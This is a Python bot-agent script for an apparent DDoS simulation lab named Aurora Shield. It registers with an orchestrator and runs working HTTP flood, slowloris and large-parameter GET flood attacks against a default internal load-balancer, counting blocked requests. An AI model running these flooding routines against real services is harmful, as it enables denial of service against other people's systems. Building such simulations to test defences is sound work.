#!/usr/bin/env python3
"""
Bot Agent for Aurora Shield Attack Simulation
Each bot runs in its own container with unique IP
"""

import requests
import time
import random
import json
import os
import threading
from datetime import datetime
import socket
import sys

class BotAgent:
    def __init__(self):
        # Get configuration from environment
        self.bot_ip = os.getenv('BOT_IP', '10.77.0.100')
        self.target_url = os.getenv('TARGET_URL', 'http://load-balancer:8090/cdn/')
        self.attack_type = os.getenv('ATTACK_TYPE', 'http_flood')
        self.orchestrator_url = os.getenv('ORCHESTRATOR_URL', 'http://attack-orchestrator:5000')
        
        # Bot state
        self.bot_id = None
        self.container_name = socket.gethostname()
        self.is_attacking = False
        self.should_stop = False
        
        # Statistics
        self.stats = {
            'requests_sent': 0,
            'requests_successful': 0,
            'requests_blocked': 0,
            'bytes_sent': 0,
            'start_time': time.time(),
            'last_request_time': 0
        }
        
        # Attack configuration
        self.attack_config = {
            'rate_per_second': 2.0,
            'duration': 30,
            'burst_mode': False,
            'randomize_intervals': True
        }
        
        print(f"🤖 Bot Agent initialized")
        print(f"   IP: {self.bot_ip}")
        print(f"   Target: {self.target_url}")
        print(f"   Attack Type: {self.attack_type}")
        print(f"   Container: {self.container_name}")

    def start(self):
        """Start bot agent with heartbeat and attack monitoring"""
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Start attack monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_commands, daemon=True)
        monitor_thread.start()
        
        print(f"✅ Bot agent {self.container_name} started")
        
        # Main execution loop
        try:
            while not self.should_stop:
                if self.is_attacking:
                    self.execute_attack_round()
                else:
                    time.sleep(1)  # Idle state
                    
        except KeyboardInterrupt:
            print("🛑 Bot agent stopping...")
        except Exception as e:
            print(f"❌ Bot agent error: {e}")
        finally:
            self.cleanup()

    def heartbeat_loop(self):
        """Send periodic heartbeat to orchestrator"""
        while not self.should_stop:
            try:
                heartbeat_data = {
                    'bot_ip': self.bot_ip,
                    'container_name': self.container_name,
                    'status': 'attacking' if self.is_attacking else 'idle',
                    'stats': {
                        'requests_sent': self.stats['requests_sent'],
                        'requests_successful': self.stats['requests_successful'],
                        'requests_blocked': self.stats['requests_blocked'],
                        'new_requests': 0,  # Incremental since last heartbeat
                        'new_successful': 0,
                        'new_blocked': 0
                    },
                    'timestamp': datetime.now().isoformat()
                }
                
                response = requests.post(
                    f"{self.orchestrator_url}/api/bot/heartbeat",
                    json=heartbeat_data,
                    timeout=5
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if not self.bot_id and result.get('bot_id'):
                        self.bot_id = result['bot_id']
                        print(f"📡 Registered with orchestrator as {self.bot_id}")
                
            except requests.RequestException as e:
                print(f"💔 Heartbeat failed: {e}")
            except Exception as e:
                print(f"❌ Heartbeat error: {e}")
            
            time.sleep(10)  # Heartbeat every 10 seconds

    def monitor_commands(self):
        """Monitor for attack commands from orchestrator"""
        while not self.should_stop:
            try:
                # Check for attack commands via environment variables or signals
                # This is a simplified implementation - in production you'd use
                # more sophisticated inter-container communication
                
                # For demo: simulate receiving attack commands
                time.sleep(5)
                
            except Exception as e:
                print(f"❌ Command monitoring error: {e}")

    def execute_attack_round(self):
        """Execute one round of attack requests"""
        try:
            # Calculate request timing
            interval = 1.0 / self.attack_config['rate_per_second']
            if self.attack_config['randomize_intervals']:
                interval *= random.uniform(0.5, 1.5)
            
            # Perform attack based on type
            if self.attack_type == 'http_flood':
                self.http_flood_attack()
            elif self.attack_type == 'slowloris':
                self.slowloris_attack()
            elif self.attack_type == 'get_flood':
                self.get_flood_attack()
            else:
                self.http_flood_attack()  # Default
            
            # Wait for next request
            time.sleep(max(0.1, interval))
            
        except Exception as e:
            print(f"❌ Attack round error: {e}")
            time.sleep(1)

    def http_flood_attack(self):
        """Standard HTTP flood attack"""
        try:
            # Generate realistic request variations
            paths = [
                '/cdn/index.html',
                '/cdn/style.css',
                '/cdn/script.js',
                '/cdn/image.png',
                '/api/data',
                '/search?q=test',
                '/product/12345',
                '/user/profile'
            ]
            
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'curl/7.68.0',
                'Python-requests/2.25.1'
            ]
            
            # Build request
            target_path = random.choice(paths)
            url = f"{self.target_url.rstrip('/')}{target_path}"
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'X-Bot-IP': self.bot_ip,  # Help with tracking
                'X-Bot-ID': self.bot_id or 'unknown'
            }
            
            # Add some realistic parameters
            params = {}
            if random.random() < 0.3:  # 30% chance of parameters
                params.update({
                    'ref': random.choice(['google', 'facebook', 'twitter', 'direct']),
                    'utm_source': 'attack_sim',
                    'timestamp': str(int(time.time()))
                })
            
            # Execute request
            start_time = time.time()
            response = requests.get(
                url,
                headers=headers,
                params=params,
                timeout=10,
                allow_redirects=True
            )
            request_time = time.time() - start_time
            
            # Update statistics
            self.stats['requests_sent'] += 1
            self.stats['last_request_time'] = time.time()
            self.stats['bytes_sent'] += len(str(headers)) + len(str(params))
            
            if response.status_code == 200:
                self.stats['requests_successful'] += 1
                print(f"✅ {self.bot_ip} -> {url} [{response.status_code}] {request_time:.3f}s")
            elif response.status_code in [429, 503, 403]:
                self.stats['requests_blocked'] += 1
                print(f"🛡️ {self.bot_ip} -> {url} BLOCKED [{response.status_code}]")
            else:
                print(f"⚠️ {self.bot_ip} -> {url} [{response.status_code}] {request_time:.3f}s")
            
        except requests.Timeout:
            print(f"⏰ {self.bot_ip} -> {url} TIMEOUT")
            self.stats['requests_sent'] += 1
        except requests.ConnectionError:
            print(f"💔 {self.bot_ip} -> {url} CONNECTION_ERROR")
            self.stats['requests_sent'] += 1
        except Exception as e:
            print(f"❌ {self.bot_ip} attack error: {e}")

    def slowloris_attack(self):
        """Slowloris-style attack (simplified)"""
        try:
            # Open connection and send partial headers
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            # Extract host and port from target URL
            from urllib.parse import urlparse
            parsed = urlparse(self.target_url)
            host = parsed.hostname or 'load-balancer'
            port = parsed.port or 8090
            
            sock.connect((host, port))
            
            # Send partial HTTP request
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: SlowBot-{self.bot_ip}\r\n"
            sock.send(request.encode())
            
            # Keep connection alive with periodic headers
            for i in range(10):
                time.sleep(2)
                sock.send(f"X-Keep-Alive-{i}: {time.time()}\r\n".encode())
            
            sock.close()
            self.stats['requests_sent'] += 1
            print(f"🐌 {self.bot_ip} slowloris connection completed")
            
        except Exception as e:
            print(f"❌ {self.bot_ip} slowloris error: {e}")

    def get_flood_attack(self):
        """GET request flood with large parameters"""
        try:
            # Generate large parameter payload
            large_params = {f'param_{i}': 'x' * 1000 for i in range(10)}
            
            url = self.target_url
            headers = {
                'User-Agent': f'GetFloodBot-{self.bot_ip}',
                'X-Bot-IP': self.bot_ip
            }
            
            response = requests.get(url, headers=headers, params=large_params, timeout=10)
            
            self.stats['requests_sent'] += 1
            self.stats['bytes_sent'] += 10000  # Approximate large payload
            
            if response.status_code == 200:
                self.stats['requests_successful'] += 1
            elif response.status_code in [429, 503, 403]:
                self.stats['requests_blocked'] += 1
            
            print(f"📦 {self.bot_ip} GET flood -> [{response.status_code}]")
            
        except Exception as e:
            print(f"❌ {self.bot_ip} GET flood error: {e}")

    def start_attack(self, attack_type=None, duration=30, rate=2.0):
        """Start attack with specified parameters"""
        if attack_type:
            self.attack_type = attack_type
        
        self.attack_config.update({
            'rate_per_second': rate,
            'duration': duration
        })
        
        self.is_attacking = True
        print(f"🚀 {self.bot_ip} starting {self.attack_type} attack")
        print(f"   Rate: {rate} req/s for {duration}s")
        
        # Auto-stop after duration
        def stop_after_duration():
            time.sleep(duration)
            self.stop_attack()
        
        timer_thread = threading.Thread(target=stop_after_duration, daemon=True)
        timer_thread.start()

    def stop_attack(self):
        """Stop current attack"""
        self.is_attacking = False
        print(f"🛑 {self.bot_ip} attack stopped")
        print(f"   Stats: {self.stats['requests_sent']} sent, "
              f"{self.stats['requests_successful']} successful, "
              f"{self.stats['requests_blocked']} blocked")

    def cleanup(self):
        """Cleanup before shutdown"""
        self.should_stop = True
        self.is_attacking = False
        print(f"🧹 Bot agent {self.container_name} cleanup complete")

    def print_status(self):
        """Print current bot status"""
        uptime = time.time() - self.stats['start_time']
        print(f"\n📊 Bot {self.bot_ip} Status:")
        print(f"   Uptime: {uptime:.1f}s")
        print(f"   Attacking: {self.is_attacking}")
        print(f"   Requests: {self.stats['requests_sent']} sent")
        print(f"   Success: {self.stats['requests_successful']}")
        print(f"   Blocked: {self.stats['requests_blocked']}")
        print(f"   Data: {self.stats['bytes_sent']} bytes")

def main():
    """Main bot agent entry point"""
    bot = BotAgent()
    
    # Check for immediate attack command
    if len(sys.argv) > 1:
        if sys.argv[1] == 'attack':
            attack_type = sys.argv[2] if len(sys.argv) > 2 else 'http_flood'
            duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30
            rate = float(sys.argv[4]) if len(sys.argv) > 4 else 2.0
            
            bot.start_attack(attack_type, duration, rate)
    
    # Auto-start light attack for demo
    elif os.getenv('AUTO_ATTACK', 'false').lower() == 'true':
        bot.start_attack('http_flood', 60, 1.0)
    
    # Start bot agent
    bot.start()

if __name__ == '__main__':
    main()